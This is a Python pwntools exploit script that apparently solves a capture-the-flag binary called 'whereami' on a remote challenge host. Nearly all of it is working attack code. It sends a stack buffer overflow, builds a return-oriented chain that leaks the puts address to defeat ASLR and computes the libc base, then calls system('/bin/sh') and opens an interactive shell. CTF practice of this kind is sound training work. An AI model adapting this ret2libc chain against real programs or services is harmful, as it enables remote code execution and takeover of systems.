#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.actf.co --port 31222 ./whereami
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./whereami')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31222)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = ELF("./libc.so.6")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.33.so")
main = 0x00000000004011f6
counter = 0x40406c
pop_rdi = 0x0000000000401303
puts_got = exe.got['puts']
puts_plt = exe.plt['puts']
gets_plt = exe.plt['gets']

p = b'a'*72
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(pop_rdi)
p += p64(counter)
p += p64(gets_plt)
p += p64(pop_rdi+1)
p += p64(main)
# p += p64(main)
io.sendlineafter(b"? ",p)
io.recvuntil(b"o.\n")
leak = u64(io.recvline()[:-1].ljust(8,b"\x00"))
print (hex(leak))
libc.address=  leak - libc.sym['puts']
print (hex(libc.address))

io.sendline(b"\x00")

p = b'a'*72
p += p64(pop_rdi)
p += p64(next(libc.search(b"/bin/sh\x00")))
p += p64(pop_rdi+1)
p += p64(libc.sym['system'])
io.sendlineafter(b"? ",p)




io.interactive()

